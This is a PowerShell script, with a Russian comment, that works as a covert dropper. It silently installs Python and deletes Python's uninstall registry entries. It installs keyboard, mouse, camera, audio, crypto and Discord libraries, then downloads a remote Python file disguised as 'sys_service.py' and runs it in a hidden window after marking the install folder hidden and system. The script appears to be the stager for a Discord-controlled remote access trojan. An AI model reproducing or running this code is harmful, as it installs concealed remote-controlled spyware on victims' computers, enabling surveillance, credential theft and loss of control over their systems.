$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

$pyDir = "$env:LOCALAPPDATA\Programs\Python\Python311"
$pyPath = "$pyDir\python.exe"

$wc = New-Object Net.WebClient
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not (Test-Path $pyPath)) {
    $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", "$env:TEMP\py_setup.exe")
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
    Remove-Item "$env:TEMP\py_setup.exe" -Force

    $uninstallBase = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $uninstallBase -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
}

if (-not (Test-Path $pyPath)) { exit }

& $pyPath -m pip install --upgrade pip -q
& $pyPath -m pip install discord.py keyboard mouse psutil pyttsx3 requests pywin32 pycryptodome Pillow comtypes pycaw opencv-python pyaudio -q

$repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
$botPath = "$env:TEMP\sys_service.py"
$wc.DownloadFile($repoUrl, $botPath)

# Запуск через pythonw.exe напрямую (оконный режим без консоли)
$pyw = Join-Path $pyDir "pythonw.exe"
attrib +h +s "$env:LOCALAPPDATA\Programs\Python" | Out-Null
Start-Process -FilePath $pyw -ArgumentList "-W ignore `"$botPath`"" -WindowStyle Hidden
